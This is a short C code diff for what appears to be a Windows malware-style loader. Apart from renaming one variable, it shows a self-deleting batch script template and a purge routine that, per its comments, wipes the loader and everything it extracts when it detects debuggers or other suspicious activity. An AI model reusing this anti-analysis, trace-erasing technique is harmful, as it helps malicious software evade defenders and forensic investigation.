@@ -60,7 +60,7 @@ INT WINAPI wWinMain(
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered ( / called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-const static WCHAR szSelfDelBat[] = {
+const static WCHAR t_szSelfDelBat[] = {
 	L"@echo off\n"
 	L"%x:\n"
 	L"\tdel \"%s\" /f\n"
@@ -82,7 +82,7 @@ VOID fnPurge() {
 	PVOID pScriptW = HeapAlloc(g_hPH, 0, 0x800);
 	UINT uiRandomID = fnNext128ss();
 	PCWSTR szMFN = fnGetFileNameFromPathW(g_szMFN);
-	StringCchPrintfW(pScriptW, 0x400, szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
+	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
 
 	// Convert to Raw (ANSI)
 	SIZE_T nScript;
